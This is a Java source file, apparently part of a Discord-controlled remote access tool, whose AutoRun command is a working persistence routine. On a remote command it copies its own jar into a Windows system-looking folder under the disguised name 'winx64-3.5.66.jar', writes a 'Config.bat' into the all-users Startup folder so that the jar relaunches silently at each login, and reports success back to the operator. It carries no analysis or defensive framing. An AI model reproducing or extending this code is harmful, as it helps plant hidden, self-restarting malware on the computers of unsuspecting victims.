package InvisibleCat.tabber.command.commands;

import InvisibleCat.tabber.App;
import InvisibleCat.tabber.command.Command;

import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.net.URISyntaxException;
import java.util.ArrayList;


public class AutoRun implements Command {
    private String extra = "Autorun setup successful on " + App.getInfo() + "!";


    @Override
    public String extraMessage() {
        return extra;
    }

    @Override
    public String displayMessage() {
        return "Autorun setting up on " + App.getInfo();
    }

    @Override
    public void run(ArrayList<String> args, Member author, Message message)  {
        System.out.println(System.getProperty("user.home"));
        char letter = System.getProperty("user.home").charAt(0);
        try {
            copyFile(new File(App.class.getProtectionDomain()
                            .getCodeSource()
                            .getLocation()
                            .toURI()
                            .getPath()),
                    new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.66.jar"));
            File f = new File(letter + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Config.bat");
            f.getParentFile().mkdirs();
            f.createNewFile();
            FileWriter writer = new FileWriter(letter + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Config.bat");
            writer.write("@echo off \n start javaw -jar " + System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.66.jar");
            writer.close();
        } catch (IOException | URISyntaxException e) {
            extra = "An error has occurred: ```" + e + "```";
        }
}
    private static void copyFile(File source, File dest) throws IOException {
        FileUtils.copyFile(source, dest);
    }
}
